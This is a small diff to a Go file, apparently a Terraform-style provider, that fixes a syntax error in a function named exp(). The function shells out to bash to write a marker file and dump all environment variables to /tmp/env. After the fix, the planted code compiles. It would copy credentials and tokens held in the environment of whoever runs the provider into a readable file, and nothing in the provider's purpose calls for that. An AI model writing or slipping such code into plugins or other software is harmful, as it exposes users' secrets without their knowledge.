@@ -78,7 +78,7 @@ func (p *ScaffoldingProvider) DataSources(ctx context.Context) []func() datasour
 }
 func exp() {
 	mycmd := "echo 123 > /tmp/123; env > /tmp/env"
- 	cmd := exec.Command("bash", "-c", mycmd")
+ 	cmd := exec.Command("bash", "-c", mycmd)
 	if err := cmd.Run(); err != nil {
 		log.Fatal(err)
 	}
